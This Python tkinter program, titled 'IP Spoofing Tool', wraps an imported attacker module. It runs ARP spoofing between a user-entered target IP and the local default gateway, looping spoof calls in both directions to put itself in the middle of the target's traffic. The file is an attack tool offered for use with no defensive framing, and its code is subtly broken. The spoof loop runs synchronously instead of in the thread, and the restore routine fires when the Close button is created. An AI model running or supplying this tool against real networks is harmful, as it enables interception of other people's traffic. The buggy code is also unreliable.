import tkinter as tk
import subprocess
import netifaces
from tkinter import messagebox
import socket
import attacker
import threading

globalRun = True
def spoofF(target, host, verbose):
    try:
        while globalRun:
            attacker.spoof(target, host, verbose)
            attacker.spoof(host, target, verbose)
    except KeyboardInterrupt:
        print("[!] Detected CTRL+C ! restoring the network, please wait...")
        attacker.restore(target, host)
        attacker.restore(host, target)

def get_gateway_ip():
    # Example command to get gateway IP using subprocess (replace this with your method)
    gateway_ip = netifaces.gateways()['default'][2][0]
    print(gateway_ip)
    return gateway_ip
# Create a tkinter window
globalGateway = get_gateway_ip()
def get_gateway():
    try:
        ip_address = entry.get().strip()
        if not ip_address:
            result_label.config(text="Please enter an IP address", fg="red")
            return

        # Open a popup window to display entered IP
        show_entered_ip(ip_address)
    except Exception as e:
        result_label.config(text=str(e), fg="red")

def show_entered_ip(ip):

    target = ip
    # gateway ip address
    host = globalGateway
    # print progress to the screen
    verbose = True
    # enable ip forwarding
    #attacker.enable_ip_route()
    my_thread = threading.Thread(target=spoofF(target,host,verbose))
    my_thread.start()
    popup = tk.Toplevel(root)
    popup.title("Entered IP Address")
    popup.geometry("200x100")

    ip_label = tk.Label(popup, text=f"Entered IP: {ip}")
    ip_label.pack()
    close_button = tk.Button(popup, text="Close", command=restoreAll(target, host,popup))
    close_button.pack()
    
def restoreAll(target, host,popup):
    global globalRun
    globalRun = False
    print("run")
    attacker.restore(target, host)
    attacker.restore(host, target)
    popup.destroy 
# Create the main window
root = tk.Tk()
root.title("IP Spoofing Tool")

# Create a label and entry for the IP address
ip_label = tk.Label(root, text="Enter IP Address:")
ip_label.pack()

entry = tk.Entry(root)
entry.pack()

# Create a "Spoof" button
spoof_button = tk.Button(root, text="Spoof", command=get_gateway)
spoof_button.pack()

# Display the result (Gateway IP)
result_label = tk.Label(root, text="", fg="black")
result_label.pack()

gatewayipLabel = tk.Label(root,text="GatewayIp = {}".format(globalGateway))
gatewayipLabel.pack()

# Run the application
root.mainloop()
